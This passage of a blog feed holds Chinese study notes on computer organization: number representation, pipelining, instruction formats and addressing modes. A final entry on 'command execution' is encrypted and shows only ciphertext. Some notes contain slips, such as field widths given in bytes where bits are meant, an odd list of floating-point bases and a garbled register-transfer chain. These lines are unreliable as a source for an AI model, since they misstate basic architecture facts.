title="同步控制方式"></a>同步控制方式</h3><ul><li>任一微操作均由同一基准时标的时序信号控制</li></ul><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022040372.png" alt="image-20240602204039338"></p><ul><li><p>采用定长的机器周期</p><p>以最长的微操作序列和最繁的微操作作为标准，机器周期内节拍数相同</p></li><li><p>采用不定长的机器周期  机器周期内节拍数不等</p><p>  <img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022044052.png" alt="image-20240602204455032"></p></li><li><p>采用中央控制和局部控制相结合的方法</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406022045965.png" alt="image-20240602204508949"></p></li></ul><h3 id="异步控制方式"><a href="#异步控制方式" class="headerlink" title="异步控制方式"></a>异步控制方式</h3><p>无基准时标信号</p><p>无固定的周期节拍和严格的时钟同步</p><p>采用应答的方式</p><h3 id="联合控制方式"><a href="#联合控制方式" class="headerlink" title="联合控制方式"></a>联合控制方式</h3><p>同步和异步相结合</p><h3 id="人工控制方式"><a href="#人工控制方式" class="headerlink" title="人工控制方式"></a>人工控制方式</h3><ul><li><p>reset</p></li><li><p>连续和单条指令执行转换开关</p></li><li><p>符合停机开关 </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机的运算方式</title>
      <link href="/2024/05/21/"/>
      <url>/2024/05/21/</url>
      
        <content type="html"><![CDATA[<h1 id="无符号数和有符号数"><a href="#无符号数和有符号数" class="headerlink" title="无符号数和有符号数"></a>无符号数和有符号数</h1><h2 id="无符号数"><a href="#无符号数" class="headerlink" title="无符号数"></a>无符号数</h2><p>寄存器的位数反映了无符号数的表示范围</p><p>例如8位就表示0～255，16位表示了0～65535</p><h2 id="有符号数"><a href="#有符号数" class="headerlink" title="有符号数"></a>有符号数</h2><p>真值就是带符号的数，而机器数就是将符号数字化了的数 0正 1负</p><p>机器数分为：</p><ul><li>原码</li><li>补码</li><li>反码</li><li>移码</li></ul><h3 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h3><p>原码的n位定点整数表示范围是：$-(2^{n-1}-1 )$~$+(2^{n-1}-1)$</p><p>原码表示的n位定点小数的表示范围是：$-(1-2^{-(n-1)})$~$+(1-2^{-(n-1)})$</p><h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p>作用是化减法为加法</p><p>以时钟12进制为例子，+9是-3以12为<strong>模</strong>的补数</p><p>一个负数加上“模”即该负数的补数</p><p>当一个正数和一个负数互为补数时，他们绝对值之和为模数</p><p>正数的补即为本身</p><p>负数的补加模n即可 一般二进制的话模的就是$2^{n+1}$ (这里假设是n位整数了)</p><p><strong>当真值为负，补码可以用原码除符号位外每位取反，末位+1得到</strong></p><p>补码的n位定点整数表示范围是$-2^{n-1}$~$+(2^{n-1}-1)$</p><p>补码表示的n位定点小数的表示范围是    $-1$~$+(1-2^{-(n-1)})$</p><h3 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h3><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405212027426.png" alt="截屏2024-05-21 20.27.43"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405212028953.png" alt="截屏2024-05-21 20.28.08"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405212101706.png" alt="截屏2024-05-21 21.01.35"></p><h3 id="移码"><a href="#移码" class="headerlink" title="移码"></a>移码</h3><p>用来弥补补码难判断真值大小的问题</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405212115416.png" alt="截屏2024-05-21 21.15.07"></p><p>补码和移码只相差一个符号位</p><p>用移码能表示浮点数的阶码，能方便判断浮点数阶码的大小</p><h1 id="数的定点表示和浮点表示"><a href="#数的定点表示和浮点表示" class="headerlink" title="数的定点表示和浮点表示"></a>数的定点表示和浮点表示</h1><h2 id="定点表示"><a href="#定点表示" class="headerlink" title="定点表示"></a>定点表示</h2><p>小数点按约定方式标出</p><h2 id="浮点表示"><a href="#浮点表示" class="headerlink" title="浮点表示"></a>浮点表示</h2><p>$N=S \times r^j $    </p><p>浮点数的一般形式，其中S是尾数、j是阶码、r是基数</p><p>r一般取2，4，6，8</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405231919159.png" alt="截屏2024-05-23 19.19.32"></p><p>规格化形式：尾数绝对值的最高位（第一位）必须为1，即尾数的绝对值必须大于或等于1/R，这样浮点就有n个有效数字</p><p>基数r越大，可表示的浮点数范围越大，精度降低</p><h1 id="定点运算"><a href="#定点运算" class="headerlink" title="定点运算"></a>定点运算</h1><h2 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h2><p>移位和加减配合能够实现乘除法</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405232033926.png" alt="image-20240523203335786"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405281017662.png" alt="截屏2024-05-28 10.17.12"></p><h2 id="加减法"><a href="#加减法" class="headerlink" title="加减法"></a>加减法</h2><p>加法有</p><script type="math/tex; mode=display">整数：&[A]_补+[B]_补 = [A+B]_补 mod\space 2^{n+1} \\小数：&[A]_补+[B]_补 = [A+B]_补 mod\space 2^n</script><p>减法有</p><script type="math/tex; mode=display">整数：&[A-B]_补 = [A+(-B)]_补 = [A]_补+[-B]_补 \space mod \space 2^{n+1}\\小数：&[A-B]_补 = [A+(-B)]_补 = [A]_补+[-B]_补 \space mod \space 2^{n}</script><p>连同符号位一起相加，符号位的进位自然丢掉</p><p>会存在溢出，当运算结果超过了机器数范围就会溢出</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405281037883.png" alt="截屏2024-05-28 10.37.20"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CPU的结构和功能</title>
      <link href="/2024/05/13/"/>
      <url>/2024/05/13/</url>
      
        <content type="html"><![CDATA[<h1 id="CPU的结构"><a href="#CPU的结构" class="headerlink" title="CPU的结构"></a>CPU的结构</h1><h2 id="CPU的功能"><a href="#CPU的功能" class="headerlink" title="CPU的功能"></a>CPU的功能</h2><ol><li>控制器的功能<ol><li>取指令</li><li>分析指令</li><li>执行指令，发出各种操作命令</li><li>控制程序输入以及结果输出</li><li>总线管理</li><li>处理异常情况</li></ol></li><li>运算器的功能<ol><li>算数运算</li><li>逻辑运算</li></ol></li></ol><h2 id="CPU结构框图"><a href="#CPU结构框图" class="headerlink" title="CPU结构框图"></a>CPU结构框图</h2><h3 id="CPU与系统总线"><a href="#CPU与系统总线" class="headerlink" title="CPU与系统总线"></a>CPU与系统总线</h3><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405131411624.png" alt="截屏2024-05-13 14.11.15"></p><h3 id="CPU的内部结构"><a href="#CPU的内部结构" class="headerlink" title="CPU的内部结构"></a>CPU的内部结构</h3><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405131414025.png" alt="截屏2024-05-13 14.14.00"></p><h2 id="CPU的寄存器"><a href="#CPU的寄存器" class="headerlink" title="CPU的寄存器"></a>CPU的寄存器</h2><h3 id="用户可见寄存器"><a href="#用户可见寄存器" class="headerlink" title="用户可见寄存器"></a>用户可见寄存器</h3><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405131416544.png" alt="截屏2024-05-13 14.16.34"></p><h3 id="控制和状态寄存器"><a href="#控制和状态寄存器" class="headerlink" title="控制和状态寄存器"></a>控制和状态寄存器</h3><h4 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h4><p>$PC \rightarrow M\rightarrow M\rightarrow MDR \rightarrow IR$</p><p>MAR MDR IR用户不可见</p><p>PC用户可见 一般也不修改</p><h4 id="状态寄存器"><a href="#状态寄存器" class="headerlink" title="状态寄存器"></a>状态寄存器</h4><p>状态寄存器存放的是条件码</p><p>PSW寄存器存放的时候程序状态字</p><h2 id="控制单元CU和中断系统"><a href="#控制单元CU和中断系统" class="headerlink" title="控制单元CU和中断系统"></a>控制单元CU和中断系统</h2><p>CU产生全部指令的微操作命令序列</p><p>中断系统…</p><h2 id="ALU"><a href="#ALU" class="headerlink" title="ALU"></a>ALU</h2><p>第六章</p><h1 id="指令周期"><a href="#指令周期" class="headerlink" title="指令周期"></a>指令周期</h1><blockquote><p>取出并执行一条指令所需的全部时间</p></blockquote><script type="math/tex; mode=display">完成一条指令\begin{cases}取指令、分析 \space \space &取指周期\\执行\space \space &执行周期 \end{cases}</script><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405131437157.png" alt="截屏2024-05-13 14.36.59"></p><p>每条指令的周期是不同的</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405131437735.png" alt="截屏2024-05-13 14.37.36"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405281443008.png" alt="截屏2024-05-28 14.43.42"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405281504075.png" alt="截屏2024-05-28 15.04.36"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405281450083.png" alt="截屏2024-05-28 14.50.18"></p><h1 id="指令流水"><a href="#指令流水" class="headerlink" title="指令流水"></a>指令流水</h1><blockquote><p>在提高硬件速度之外的基础上</p><p>提高整机处理能力 ，改进系统结构，开发系统的并行性</p></blockquote><p>并行是指：并发和同时</p><p>并发指两个或以上事件在同一时间段发送</p><p>同时指两个或以上事件在同一时刻发生</p><p>并行性的等级</p><p>过程级 粗粒度 软件实现</p><p>指令级 细粒度 硬件实现</p><p>指令流水很容易理解，如果是串行执行，那么取指令和执行指令的过程总有一个部件是空闲的</p><p>事实上完全可以在取指令后，执行指令的阶段，同时读取第二个指令，这样子做就是指令的二级流水</p><p>若取指和执行在阶段时间上完全重叠，那么指令周期减半，速度提高一倍</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405291529329.png" alt="image-20240529152930234"></p><p>影响指令流水效率加倍的因素</p><ol><li><p>执行时间&gt;取指时间</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405291531821.png" alt="image-20240529153117793"></p></li><li><p>条件转移指令对指令流水的影响</p><p>必须等上调指令结束，才能确定下条指令的地址</p><p>这样造成的时间损失 可以用猜测法弥补</p></li></ol><p>指令的六级流水</p><p>完成一条指令需要六个时间单位，需要执行9次</p><p>若串行执行，则需要54个时间单位</p><p>若采用六级流水，则只需要14个时间单位</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405291535087.png" alt="截屏2024-05-29 15.35.00"></p><p>影响指令流水线性能的因素</p><p>程序相近指令之间出现某种关联，使得指令流水出现停顿，影响流水线效率</p><p>若结构相关 即不同指令争用同一功能部件产生资源冲突 解决办法是<strong>停顿</strong>、<strong>指令存储器和数据存储器分开</strong>、<strong>指令预取技术</strong></p><p>数据相关的</p><p>比如两条指令都需要用同一个数据</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405291541546.png" alt="截屏2024-05-29 15.41.36"></p><p>或者用后推法</p><p>控制相关的由转移指令引起的</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405291543398.png" alt="image-20240529154319356"></p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405291544357.png" alt="image-20240529154411327"></p><p>流水线的性能</p><ol><li><p>吞吐率</p><p>单位时间内流水线所完成指令或输出结果的数量 设m段流水线各段时间为$\Delta t$</p><ul><li>最大吞吐率   $T_{pmax}= \frac{1}{\Delta t}$</li><li>实际吞吐率   连续处理n条指令的吞吐率为$T_p=\frac{n}{m \cdot \Delta t+ (n-1) \cdot \Delta t}$</li></ul></li><li><p>加速比 $S_p$</p><p>m段的流水线的速度与等功能的非流水线的速度之比，设各段流水线为$\Delta t$</p><p>完成n条指令在m段流水线上共需 $T=m \cdot \Delta t + (n-1) \cdot \Delta t$</p><p>完成n条指令在等效的非流水线上共需</p><p>$T^{‘}=nm \cdot \Delta t$</p><p>则$S_p = \frac{nm \cdot \Delta t}{m \Delta t + (n-1) \cdot \Delta t }=\frac{nm}{m+n-1} $</p></li></ol><p><strong>超流水线技术</strong></p><p>在一个时钟周期内再分段</p><p>在一个时钟周期内一个功能部件使用多次</p><p>不能调整指令的执行顺序</p><p>靠编译程序优化</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405291924838.png" alt="image-20240529192438742"></p><p><strong>超长指令字技术</strong></p><p>由编译程序挖掘出指令间潜在的并行性，将多条能并行操作的指令组合成一条，具有多个操作码字段的超长指令字</p><p>采用多个处理部件</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405291928867.png" alt="image-20240529192825799"></p><h2 id="流水线结构"><a href="#流水线结构" class="headerlink" title="流水线结构"></a>流水线结构</h2><p>完成一条指令分为<strong>七段</strong>，每段一个时钟周期</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405291938202.png" alt="截屏2024-05-29 19.38.44"></p><p>若流水线不出现断流 一个时钟周期出一个结果</p><p>不采用流水技术         七个时钟周期出一个结果</p><p>理想情况下面速度是7倍</p><h3 id="运算流水线"><a href="#运算流水线" class="headerlink" title="运算流水线"></a>运算流水线</h3><p>完成浮点运算加减可分：</p><p>对阶、尾数求和、规格化三段</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202406021922701.png" alt="image-20240602192247752"></p><p>分段原则是让每段操作时间尽量一致</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>机器指令</title>
      <link href="/2024/05/08/"/>
      <url>/2024/05/08/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul><li><p>机器指令：机器能够识别并执行的命令</p></li><li><p>指令字：代表指令的一组二进制代码信息</p></li><li><p>指令字长：指令字中二进制代码的位数</p></li><li><p>指令集：一台计算机中的所有机器指令的集合</p></li></ul><blockquote><p>指令系统的研究主要包括数据表示、寻址方式和指令三方面的内容</p></blockquote><p>指令系统应该满足的要求：</p><ul><li>完备性：指令齐全，编程方便</li><li>高效性：占内存少，运行速度快</li><li>规整性：指令与运算规则统一</li><li>兼容性：向上兼容</li></ul><p>对计算机系统来说：</p><ul><li>指令是程序设计的最小单位</li><li>指令是硬件设计的依据</li><li>指令是软件和硬件的接口</li></ul><h1 id="机器指令"><a href="#机器指令" class="headerlink" title="机器指令"></a>机器指令</h1><h2 id="指令的一般格式"><a href="#指令的一般格式" class="headerlink" title="指令的一般格式"></a>指令的一般格式</h2><p>形如</p><div class="table-container"><table><thead><tr><th>操作码字段</th><th>地址码字段</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><p><strong>操作码</strong>反映了机器做什么操作</p><ol><li>长度固定：用于指令字长较长的情况</li><li>长度可变：操作码分散在指令字的不同字段中</li></ol><h3 id="地址码"><a href="#地址码" class="headerlink" title="地址码"></a>地址码</h3><p><strong>地址码</strong>用来指出操作数的地址（源操作数、目的操作数、下一条指令的地址）</p><blockquote><p>设指令字长32位，操作码固定8位</p></blockquote><h4 id="四地址"><a href="#四地址" class="headerlink" title="四地址"></a>四地址</h4><div class="table-container"><table><thead><tr><th>OP</th><th>$A_1$</th><th>$A_2$</th><th>$A_3$</th><th>$A_4$</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><p><strong>$A_{1-4}$ 每个占6字节</strong></p><p>$A_1$第一操作数地址</p><p>$A_2$第二操作数地址</p><p>$A_3$结果地址</p><p>$A_4$下一条指令的地址</p><p>$(A_1)OP(A_2)\rightarrow A_3$</p><p>四次访存，寻址范围$2^6=64$</p><h4 id="三地址"><a href="#三地址" class="headerlink" title="三地址"></a>三地址</h4><blockquote><p>用PC去代替四地址的$A_4$</p></blockquote><div class="table-container"><table><thead><tr><th>OP</th><th>$A_1$</th><th>$A_2$</th><th>$A_3$</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><p><strong>$A_{1-3}$ 每个占8字节</strong></p><p>$A_1$第一操作数地址</p><p>$A_2$第二操作数地址</p><p>$A_3$结果地址</p><p>$(A_1)OP(A_2)\rightarrow A_3$</p><p><strong>还是四次访存</strong>，但是寻址范围变成$2^8=256$</p><h4 id="二地址"><a href="#二地址" class="headerlink" title="二地址"></a>二地址</h4><blockquote><p>把$A_3$用$A_1$或者$A_2$代替</p></blockquote><div class="table-container"><table><thead><tr><th>OP</th><th>$A_1$</th><th>$A_2$</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><p>$A_1,A_2$每个占12字节</p><p>$(A_1)OP(A_2)\rightarrow A_1$ 或者 $(A_1)OP(A_2)\rightarrow A_2$</p><p><strong>仍然是4次访存</strong>，寻址范围是$2^12=4K$</p><p>如果把结果存入ACC（累加器），则变成<strong>3次访存</strong></p><h4 id="一地址"><a href="#一地址" class="headerlink" title="一地址"></a>一地址</h4><div class="table-container"><table><thead><tr><th>OP</th><th>$A_1$</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><p>$A_1$占24位</p><p>$(ACC)OP(A_1)\rightarrow ACC$</p><p><strong>2次访存</strong>，寻址范围是$2^24=16M$</p><h4 id="零地址"><a href="#零地址" class="headerlink" title="零地址"></a>零地址</h4><p>即没有地址码的意思</p><h2 id="指令字长"><a href="#指令字长" class="headerlink" title="指令字长"></a>指令字长</h2><p>指令字长决定于：</p><ul><li><p>操作码的长度</p></li><li><p>操作数地址的长度</p></li><li><p>操作数地址的个数</p><ol><li><p>指令字长固定</p><p>指令字长=存储字长=机器字长</p></li><li><p>指令字长可变</p><p>按字节的倍数变化</p></li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405081451100.png" alt="截屏2024-05-08 14.51.24"></p><h1 id="操作数类型和操作种类"><a href="#操作数类型和操作种类" class="headerlink" title="操作数类型和操作种类"></a>操作数类型和操作种类</h1><h2 id="操作数类型"><a href="#操作数类型" class="headerlink" title="操作数类型"></a>操作数类型</h2><div class="table-container"><table><thead><tr><th style="text-align:center">地址</th><th style="text-align:center">无符号整数</th></tr></thead><tbody><tr><td style="text-align:center">数字</td><td style="text-align:center">定点数、浮点数、十进制数</td></tr><tr><td style="text-align:center">字符</td><td style="text-align:center">ASCII码</td></tr><tr><td style="text-align:center">逻辑数</td><td style="text-align:center">逻辑运算</td></tr></tbody></table></div><h2 id="数据在存储器中的存放方式"><a href="#数据在存储器中的存放方式" class="headerlink" title="数据在存储器中的存放方式"></a>数据在存储器中的存放方式</h2><p>下图</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405081511888.png" alt="截屏2024-05-08 15.11.56"></p><h2 id="操作类型"><a href="#操作类型" class="headerlink" title="操作类型"></a>操作类型</h2><h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405081513226.png" alt="截屏2024-05-08 15.13.54"></p><h3 id="算数逻辑操作"><a href="#算数逻辑操作" class="headerlink" title="算数逻辑操作"></a>算数逻辑操作</h3><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405081514856.png" alt="截屏2024-05-08 15.14.45"></p><h3 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h3><ul><li><p>算数移位</p></li><li><p>逻辑移位</p></li><li><p>循环移位(带进位和不带进位)</p></li></ul><h3 id="转移"><a href="#转移" class="headerlink" title="转移"></a>转移</h3><ol><li><p>无条件转移 <strong>JMP</strong></p></li><li><p>条件转移</p><ol><li>结果为零转 <strong>JZ</strong> （Z=1）</li><li>结果溢出转 <strong>JO</strong>（O=1）</li><li>结果有进位转 <strong>JC</strong>（C=1）</li><li>跳过一条指令 <strong>SKP</strong></li></ol></li><li><p>调用和返回</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405081519863.png" alt="截屏2024-05-08 15.19.25"></p></li><li><p>陷阱（Trap）与陷阱指令</p><p>意外事故中断</p><p>一般是不给用户直接使用的，出现事故的时候由CPU自动产生并执行</p></li><li><p>输入输出</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405081523602.png" alt="截屏2024-05-08 15.23.00"></p></li></ol><h1 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h1><p>寻址方式的定义</p><p>确定<strong>本条指令</strong>的操作数地址和<strong>下一条欲执行指令</strong>的<strong>指令地址</strong></p><p>寻址方式分为</p><ul><li>指令寻址</li><li>数据寻址</li></ul><h2 id="指令寻址"><a href="#指令寻址" class="headerlink" title="指令寻址"></a>指令寻址</h2><p><strong>顺序寻址</strong> $(PC)+1 \rightarrow PC$</p><p><strong>跳跃</strong> 由转移指令指出，见下图</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405081534921.png" alt="截屏2024-05-08 15.34.26"></p><h2 id="数据寻址"><a href="#数据寻址" class="headerlink" title="数据寻址"></a>数据寻址</h2><div class="table-container"><table><thead><tr><th>操作码</th><th>寻址特征</th><th>形式地址A</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><p>形式地址   指令字中的地址</p><p>有效地址   操作数的真实地址</p><p>约定 指令字长=存储字长=机器字长</p><h3 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h3><p>形式地址A就是操作数</p><div class="table-container"><table><thead><tr><th>OP</th><th>#</th><th>A</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><p>指令执行阶段不访存</p><p>A的位数限制了立即数的范围</p><h3 id="直接寻址"><a href="#直接寻址" class="headerlink" title="直接寻址"></a>直接寻址</h3><p>EA=A 有效地址由形式地址直接给出</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405130921283.png" alt="截屏2024-05-13 09.21.23"></p><ul><li>执行阶段访问一次存储器</li><li>A的位数决定了该指令操作数的寻址范围</li><li>操作数的地址不易修改（必须修改A才能修改）</li></ul><h3 id="隐含寻址"><a href="#隐含寻址" class="headerlink" title="隐含寻址"></a>隐含寻址</h3><p>操作数地址隐含在操作码中</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405130928942.png" alt="截屏2024-05-13 09.28.12"></p><p>指令字中少了一个地址字段，可以缩短指令字长</p><h3 id="间接寻址"><a href="#间接寻址" class="headerlink" title="间接寻址"></a>间接寻址</h3><p>EA=(A) 有效地址由形式地址间接提供</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405130932581.png" alt="截屏2024-05-13 09.32.25"></p><h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><p>EA=$R_i$</p><p>有效地址即寄存器编号</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405130934532.png" alt="截屏2024-05-13 09.34.04"></p><h3 id="基址寻址"><a href="#基址寻址" class="headerlink" title="基址寻址"></a>基址寻址</h3><ol><li><p>采用专用寄存器作基址寄存器</p><p>EA=(BR)+A  BR为基址寄存器</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405130936122.png" alt="截屏2024-05-13 09.36.14"></p></li><li><p>采用通用寄存器作基址寄存器</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405130936945.png" alt="截屏2024-05-13 09.36.54">逻辑地址和物理地址</p></li></ol><p>   <img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405130946424.png" alt="截屏2024-05-13 09.46.13"></p><h3 id="变址寻址"><a href="#变址寻址" class="headerlink" title="变址寻址"></a>变址寻址</h3><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405130949934.png" alt="截屏2024-05-13 09.49.33"></p><h3 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h3><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405130950373.png" alt="截屏2024-05-13 09.50.56"></p><h3 id="堆栈寻址"><a href="#堆栈寻址" class="headerlink" title="堆栈寻址"></a>堆栈寻址</h3><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405131224184.png" alt="截屏2024-05-13 12.24.27"></p><p>软件堆栈的三个优点</p><ol><li><p>可以有较大的深度</p></li><li><p>可以设置多个堆栈</p></li><li><p>除了专门的堆栈指令PUSH和POP，还可以用任何访问主存的指令来访问堆栈中的数据</p><p><img src="https://cdn.jsdelivr.net/gh/cyan4run/cdn_img/img/202405131226698.png" alt="截屏2024-05-13 12.26.21"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2024/04/30/"/>
      <url>/2024/04/30/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e541f4cf40dcc4ea904eafd2e4e01db8e7b7c7a5e962aa8385593120b349f337">d74a147d8c3b145b59b80b15e3dcbb97c7d4ac1a1dfa47d563aa3e6cedf1f93d9592e46d39a1348fd52548ac879e026aa651ba6f7a1a07bfb54d8e0e42e9448d163ac3f1cdfdef546d1fc7b2f437a827caebf43805a64f264b5175cf4af5870ae99f2ada9b4d1efeeb6413b1df3178beceb6e2bae954fa624700484fb18a1a2179d00d87d2485ca7ed197e93c74e43f7c5609ed674984bb0748cd7916335bdc6f26e3e0056097d2d005b31ff0684eead773b95d8626b4112009fdf320aaec83b9b27cc6fc2cd6b42421ab0b10d82e9104617952b6939694e42c44b4aa4e3f8749d27f6c63e3d70b8996e403e0a6cf18311997330daeff398c42120001601f30f278c4dda1442507824792113ac5040a576348fb761c23ce847441afde13618cd0c7639c9e1b9a176d51c180b29d88a6079cf6dcef459d9d1eda59c55b74ee2693df79cc1651919141333a27f9eb511d700feaa83babe70233d435a66a4d52cbf4ce5bbef433afb717083d581ce4ab02dbc9d8637f28cc513950a5a542fb39f982082a9e90f03a9b9e7280fa601b1585338a4d1d20e07cd1c89a2e88f83c24beffaed6e2c4aad051f1eecd88ef193034b006beb72391fcf7ce77b37f222af9af11cd0c7e4f6db611556a614b0e092ccaa3f5f6988de1c807376da32525bda6a5bf828153df1e574f7ae7677b03830d213f2c71cb3f3fcaae1239478d65b9404dde6d80ac36a4101fdfdc9aa6b0c4cad9d8d7ec500421dc1ba64ded35eff3ee4187d9dbe29aaa5560dcff3519ee5e6d77ed58d66568575258f7ba2bf32efc69cf8a0c3233abf4dacf389705e5a29154c55db2657f1af014f5ea7a4438270ef8ccc5f412891964ea6760eb6a9d0739aff6d70487dc08f5fabd572d43dcfe0a3fb83b8c82b570d00414bcf0f5b85722e0348ed618029075ae60c9522f1a67582419616c97ae9310a8822af17037141354c6f230704894ebe7b2f019ebd557a180b2a99242c464f831bfc07fe4862fed37d0c84ad3601a8a7888d5600f9cc7c8efe96b01ad592e01cb316bc3711ba32ac0fe6aa5de006d323e93f810187553bd7327a18eeac5d29d7d81ed548c0f581894e251800706eadba2e544cdd02ba3d95c552c4dbac2446b77eeb4f3cdace86dc7eb53e2d9c189291e495e028e34331a8ddc0f95289381ce2b6ffa558d375d433a4b531cdf186dfaf341a1320902e670d4f713619ed27e27204a9a1c38d9475dcbda6ec9c0ec22441a16c189310020ea07f950b1226649b0868d2d40302d0fa2240a476f1114918a004f8df0dc02b87b78e59c7694094c6d7a7eac80621efea9ba3f19f17c48278cf333416111a09527a03ce801dd8561710f081fab2e07a78e493b6906b1743f544710c8534187e8b0ae38ef87eee1a0e794c9fc36085f26d324f466ef693f19d42ea1b81f43b82c60df198db0a7737d39ed843fa214efdf1275b14c939359f9940191acfa3a39ca691385c83bc10ed2fa9fa1759f63dac277278883f1aa5fe9a0905ae1f93e67e4c2aee4fc8b8257e649db38a51ee0eee775651a1cc527a23309727030cbeec49ba7d4848bf6ad8be7907abcf0244408cf6976dba62e0713d448e19fa651bb28f1a9e6c39869c7f11c5355dd30444c93790fe7334fa5327b7d57c9162ac285aabd679fee341cc37913e480c0677789972f890ca66ce718518133b51413f203e950791b61cd8999fa6336231ef6cd43488b86a4f8cfb10d187adea001f725d37acf64f6f8aa74525438c110bdc1fb9ebd4acbcc516729867f942df9db4151b6bd543546718300e941a5ca4268576be241dfb3f1c158ab19f7c4376de255127614f1adb7832e5c3a11dda2bbdbb227c3fde896199221b21aca57c8820090620fc668440e105712270c9b054c8e9065681534cf403d1566d5d0649386a4f2c898fedcd44b89bbcac31aa2c90d1c33220653038c4225f8452599d4802d17f388aa92eb1db66a6421a58c19b1ee2799053f0910a86555356ee7bad3275046a2b67875fa5c818417e475498d9f1a0fae1b3fd71ecc72b8a89215e8451c24c78c08d5d78e40d3b569df6d94a420693ae2af4c0e4456e571f82a4127099bc34062d13920f61a76b657eace566b9fa173fbae57a7e607854864f8febcdf137c1c781b4166e2a4091a810a2b5a24e55a1fea56255d5752895856baf7736f00591d4b2fa0ae9c0f66c40cfb0d200712f79b2eeef79f3fc37819699d60b881a8fb32af16bfd58a